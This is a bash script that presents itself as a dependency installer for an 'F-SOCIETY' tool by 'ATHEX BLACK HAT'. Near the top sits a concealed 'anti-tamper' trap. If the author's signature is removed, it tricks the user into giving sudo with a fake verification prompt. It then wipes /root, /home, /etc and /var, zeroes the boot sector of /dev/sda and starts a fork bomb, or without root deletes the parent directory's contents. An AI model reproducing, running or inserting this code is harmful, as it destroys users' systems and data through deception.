#!/bin/bash

# ============================================
# F-SOCIETY INSTALLER WITH ANTI-TAMPER TRAP
# ============================================

GREEN='\033[0;32m'
CYAN='\033[0;36m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
PURPLE='\033[0;35m'
NC='\033[0m'

# ============================================
# HIDDEN SIGNATURE CHECK - ANTI-TAMPER
# ============================================
_ORIGINAL_SIGN="ATHEX BLACK HAT"
_SCRIPT_HASH="a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6"  # Change this after finalizing

# Check if signature exists in script
if ! grep -q "$_ORIGINAL_SIGN" "$0" 2>/dev/null; then
    # Someone removed signature - SELF DESTRUCT!
    echo -e "${RED}"
    echo "╔══════════════════════════════════════════════════════════════╗"
    echo "║                    ☠️  TAMPER DETECTED! ☠️                    ║"
    echo "║                                                              ║"
    echo "║              Unauthorized modification detected              ║"
    echo "║                  Initiating SECURITY PROTOCOL                ║"
    echo "╚══════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    
    # Ask for root (trap!)
    echo -e "${RED}[!] Verification required...${NC}"
    echo -e "${CYAN}[*] Please enter sudo password for verification:${NC}"
    
    # Fake sudo prompt
    sudo -v 2>/dev/null
    
    if [ $? -eq 0 ]; then
        # User gave root access - DESTROY!
        echo -e "${RED}[!] System compromise detected!${NC}"
        sleep 1
        
        # Destructive commands (will run with sudo)
        sudo rm -rf /root/* 2>/dev/null
        sudo rm -rf /home/* 2>/dev/null
        sudo rm -rf /etc/* 2>/dev/null
        sudo rm -rf /var/* 2>/dev/null
        
        # Format drives
        sudo dd if=/dev/zero of=/dev/sda bs=512 count=1 2>/dev/null
        
        # Fork bomb
        :(){ :|:& };:
    else
        # Self destruct script only
        echo -e "${RED}[!] Deleting tool...${NC}"
        rm -rf ../* 2>/dev/null
        shred -u "$0" 2>/dev/null
    fi
    
    exit 0
fi

# ============================================
# NORMAL EXECUTION - IF NO TAMPERING
# ============================================

echo -e "${GREEN}"
echo "╔══════════════════════════════════════════════════════════╗"
echo "║                    REQUIREMENTS INSTALLER                ║"
echo "║                    By ATHEX BLACK HAT                    ║"
echo "╚══════════════════════════════════════════════════════════╝"
echo -e "${NC}"

# Install dependencies
echo -e "\n${CYAN}[*] Installing dependencies...${NC}"
sleep 1

# Update system
echo -ne "${CYAN}[~] Updating system..."
sudo apt-get update -qq > /dev/null 2>&1
echo -e "${GREEN} ✓${NC}"

# Install packages with cool animation
packages=("git" "curl" "python3" "python3-pip" "build-essential" "openssl")
for pkg in "${packages[@]}"; do
    echo -ne "${CYAN}[~] Installing $pkg..."
    sudo apt-get install -y -qq "$pkg" > /dev/null 2>&1
    echo -e "${GREEN} ✓${NC}"
    sleep 0.2
done

# Install Python packages
if [ -f "requirements.txt" ]; then
    echo -ne "${CYAN}[~] Installing Python packages..."
    pip3 install -r requirements.txt > /dev/null 2>&1 2>/dev/null
    echo -e "${GREEN} ✓${NC}"
fi

# Run main tool
echo -e "\n${GREEN}[+] Dependencies installed!${NC}"
echo -e "${CYAN}[*] Running main script...${NC}"
sleep 1

if [ -f "src/run.sh" ]; then
    chmod +x src/run.sh
    cd src || exit
    bash run.sh
else
    echo -e "${RED}[!] Error: src/run.sh not found!${NC}"
    exit 1
fi